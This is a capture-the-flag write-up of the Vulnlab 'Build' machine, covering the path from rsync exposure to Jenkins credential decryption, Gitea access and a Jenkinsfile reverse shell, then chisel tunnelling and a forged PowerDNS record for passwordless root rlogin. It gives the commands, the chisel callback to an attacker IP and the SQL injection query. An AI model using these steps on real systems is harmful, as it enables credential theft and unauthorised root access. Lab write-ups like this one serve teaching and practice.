+++
date = '2026-05-26T17:05:51+02:00'
draft = false
title = 'Build Writeup EN'
+++
**Name**: `joy.scd01`

**Date**: `23/06/2025`

![build_slide.png](/images/imgs_build/build_slide.png)

---
# Introduction

_Build_ is a Linux machine rated _Easy_, covering topics such as **data exfiltration, Jenkins exploitation, port forwarding, and privilege escalation via PowerDNS manipulation**.

Thanks to a **publicly accessible rsync module**, I was able to retrieve Jenkins' full configuration, which included an encrypted password. After decrypting it, I gained access to a **Gitea** service running on the box.

Inside Gitea, a repository contained a **Jenkinsfile**, linked to a preconfigured job. By modifying the pipeline, I gained **initial access** to the machine.

From there, I discovered that a `.rhosts` file in root’s home directory contained an internal hostname (`admin.build.vl`).
By setting up **a tunnel with Chisel** and **manipulating PowerDNS' database**, I created a fake DNS record resolving `admin.build.vl` to my own IP. This allowed me to **bypass the trust mechanism based on hostname** and log in **as root via** `**rlogin**`, **without credentials**.

---
# Techniques Used

- **Data Exfiltration & Password Cracking**
- **Jenkins RCE via Pipeline Modification**
- **Chisel Tunneling**
- **Host-Based Trust Abuse via Database Record Injection**

---
# Enumeration

## nmap

Initial full-port scan:

```bash
nmap -p- build
```

![nmap1.png](/images/imgs_build/nmap1.png)

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV build
```

![nmap-services.png](/images/imgs_build/nmap-services.png)

**Open ports**:
- **22/tcp** - ssh
- **53/tcp** - PowerDNS
- **512/tcp** - netkit-rsh rexecd
- **513/tcp** - login?
- **514/tcp** - Netkit rshd
- **873/tcp** - rsync
- **3000/tcp** - ppp
- **3306/tcp** - mysql
- **8081/tcp** - blackice-icecap

## Web - Gitea (port 3000)

The service running on **port 3000** exposes a **Gitea** interface. I found a user **`buildadm`** and a public repository **`buildadm/dev`**. Inside it was a **Jenkinsfile**, which represented a Jenkins pipeline that, at first glance, did nothing.

![jenkinsfile.png](/images/imgs_build/jenkinsfile.png)

I searched for more info about Jenkins pipelines on Google and found this article explaining how to achieve RCE through them:

Source: https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html

It looked like a great attack vector, but since I couldn’t modify the file in the repo, I moved on to enumerate the other services.

## r-Services (Ports 512 - 513 - 514)

First, I looked up ports **512, 513, and 514**:

Source: https://www.computerworld.com/article/1391548/r-services.html

They are related to **r-services** (such as **rsh, rlogin, rexec**), legacy remote access protocols based on **hostname trust** via `.rhosts` files.

_**I mention this because this research phase turned out to be crucial for the Privilege Escalation later.**_
## Rsync (port 873)

The **rsync** protocol exposed a public module named `backups`, which I downloaded:

```bash
rsync build::
```

```bash
rsync -avz build::backups backups
```

Inside was an archive: `jenkins.tar.gz`.

_It wasn't really gzipped despite the extension._

Still, it can be extracted with:

```bash
tar -xvf jenkins.tar.gz
```

The archive contained Jenkins' configuration, including:

- **`jobs/build/config.xml`**
- **`secrets/hudson.util.Secret`**
- **`secret/master.key`**

These files were useful for gaining initial access via Gitea.

---
# Initial Access – Rsync Exposure → Jenkins Creds → Gitea → Jenkins RCE

The file **`jobs/build/config.xml`** contained credentials, including an encrypted password:

![config.xml.png](/images/imgs_build/config.xml.png)

I simply googled _"how to crack jenkins credentials"_ and found this repo:

Source: [https://github.com/hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor)

It explains how Jenkins encrypts credentials:

Jenkins uses the **`master.key`** to derive another key stored in **`hudson.util.Secret`**, which in turn is used to encrypt the actual credentials saved in **`config.xml`**.

**Note**: _Even though the repo above is informative, I used a different script_:

Source: https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py

```bash
python3 j-decrypter.py jenkins_configuration/secrets/master.key jenkins_configuration/secrets/hudson.util.Secret jenkins_configuration/jobs/build/config.xml
```

![decrypted.png](/images/imgs_build/decrypted.png)

The password didn’t work via SSH, but logging into Gitea was successful.

Now that I had access, I edited the **Jenkinsfile** in **`buildadm/dev`**, adding a bash reverse shell.

![changes.png](/images/imgs_build/changes.png)

Started a listener with **netcat**, committed the changes, and got a reverse shell.

![initial-access.png](/images/imgs_build/initial-access.png)

Found the **user flag** in the home directory.

---
# Privilege Escalation – Chisel Tunneling → DNS Record Injection → rlogin Trust Abuse

As usual, I started local enumeration.

In the user’s home, along with the **user flag**, was the **`.rhosts`** file, containing:

**`admin.build.vl`**

This pointed to a **hostname-based trust mechanism**, typical of **`rlogin`**, which allows passwordless login if the client is trusted.

Knowing that **`rlogin`** was among the open ports, I knew I was on the right track.

_This goes back to what I said earlier: **if I hadn’t taken time to analyze the legacy services on ports 512–514, I would’ve completely missed the importance of** **`.rhosts`**_.

At this point I didn’t know how to exploit this further, so I turned to analyzing the **MySQL service** (on port 3306).

To access it, I needed port forwarding. I chose **chisel** for the job.

But I didn’t know the internal interface. Tools like `ip a`, `ifconfig`, or `ss` weren’t helpful.

So I checked the file **`/proc/net/route`**, which lists routing tables in hex.

```bash
cat /proc/net/route
```

![net_route.png](/images/imgs_build/net_route.png)

I copied the gateway and used an online converter to get the IP:

Source: https://www.browserling.com/tools/hex-to-ip

**Note**: _You can convert this directly on the box using bash, but it’s quicker with a converter._

![docker_net.png](/images/imgs_build/docker_net.png)

![converted.png](/images/imgs_build/converted.png)

Then I uploaded **chisel** and created the tunnel:

```bash
#attacker
chisel server -p 8000 --reverse
#victim
./chisel client 10.8.6.158:8000 R:3306:172.18.0.1:3306
```

![chisel_tunneling.png](/images/imgs_build/chisel_tunneling.png)

MySQL allowed root login with no password:

```bash
mysql -h localhost -P 3306 -u root
```

![mysql.png](/images/imgs_build/mysql.png)

I found the `powerdnsadmin` database and dumped the `user` table:

```sql
SELECT * FROM user;
```

![admin_hash.png](/images/imgs_build/admin_hash.png)

I cracked the hash using hashcat, but it led nowhere.

After a short pause, I resumed DB enumeration and checked the **`records`** table, where all DNS entries were listed.

I realized the key to PrivEsc was to forge a record pointing the hostname from **`.rhosts`** to my attacker IP.

I wrote the following query:

```sql
INSERT INTO powerdns.records (domain_id, name, type, content, ttl, prio, disabled, ordername, auth) VALUES ((SELECT id from powerdns.domains WHERE name = 'build.vl'), 'admin.build.vl', 'A', '10.8.6.158', 60, 0, 0, NULL, 1);
```

![query_injection.png](/images/imgs_build/query_injection.png)

Finally, I logged in as **root** using `rlogin`:

```bash
rlogin build -l root
```

![system_proof.png](/images/imgs_build/system_proof.png)

The **root flag** was in the home directory.

---

# Final Thoughts

As always, Vulnlab machines are masterpieces.
They introduce new techniques, alternative tools, and real-world-like scenarios.

The key to this box was deeply understanding the environment and what services were running. Thorough enumeration often reveals the paths to PrivEsc or initial access.

In _Build_, paying attention to legacy services like `rlogin` and the `.rhosts` file was critical to rooting the box.
If I hadn’t taken time to analyze those ports early on, I might’ve been stuck much longer.

The **pipeline injection** for Jenkins RCE was also very interesting — I had never exploited it before.

**Despite looking complex at first,** _**Build**_ **is actually a well-structured and logical box**, if you **understand the underlying services**.
That’s exactly why its _Easy_ rating is justified.

**Sources**:

- **Jenkins Pipeline Remote Code Execution** | https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html
- **Info on Ports 512-514 (r-services)** | https://www.computerworld.com/article/1391548/r-services.html
- **Understanding Jenkins Credential Encryption** | [https://github.com/hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor)
- **Credential Cracking Script** | https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py
- **Hex-to-IP Converter** | https://www.browserling.com/tools/hex-to-ip